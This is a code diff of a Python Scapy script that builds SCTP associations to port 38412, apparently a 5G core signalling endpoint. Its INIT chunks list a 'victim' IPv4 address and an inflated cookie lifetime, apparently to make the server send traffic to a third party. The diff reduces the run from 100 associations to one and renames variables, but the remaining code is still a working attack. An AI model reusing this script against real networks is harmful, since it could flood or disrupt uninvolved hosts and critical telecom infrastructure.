@@ -16,8 +16,7 @@ src_address = "192.0.2.1"
 src_port = 40000
 dst_address = "192.0.2.2"
 dst_port = 38412
-victim_addresses = ["192.0.2.3"]
-number_of_associations = 100
+victim_address = "192.0.2.3"
 
 eth_ip = Ether() / IP(src=src_address, dst=dst_address)
 
@@ -38,8 +37,7 @@ def rcv_pkt_callback(sniffer: AsyncSniffer, pkt: Packet, cookie_echo_pkt: Packet
 
 def create_init_chunk() -> SCTPChunkInit:
     params = []
-    for address in victim_addresses:
-        params.append(SCTPChunkParamIPv4Addr(addr=address))
+    params.append(SCTPChunkParamIPv4Addr(addr=victim_address))
     params.append(SCTPChunkParamCookiePreservative(sug_cookie_inc=6 * pow(10, 7)))
     return SCTPChunkInit(
         init_tag=randint(1, pow(2, 32) - 1),
@@ -51,16 +49,16 @@ def create_init_chunk() -> SCTPChunkInit:
     )
 
 
-init_chunk = create_init_chunk()
+chunk_init = create_init_chunk()
 
 
 def init_association(src_port, dst_port):
     sctp = SCTP(sport=src_port, dport=dst_port, tag=0x0)
-    init_pkt = eth_ip / sctp / init_chunk
+    init_pkt = eth_ip / sctp / chunk_init
 
     init_ack_pkt = srp1(init_pkt, iface=network_interface)
     init_ack_chunk = init_ack_pkt.getlayer(SCTPChunkInitAck)
-    if init_ack_chunk is None: 
+    if init_ack_chunk is None:
         return
     init_ack_chunk_params = init_ack_chunk.fields.get("params")
 
@@ -79,7 +77,5 @@ def init_association(src_port, dst_port):
     )
     sniffer.start()
 
-
-for x in range(number_of_associations - 1):
-    init_association(src_port + x, dst_port)
-input("Press any key to exit.")
+init_association(src_port, dst_port)
+input("Press a key to exit.")
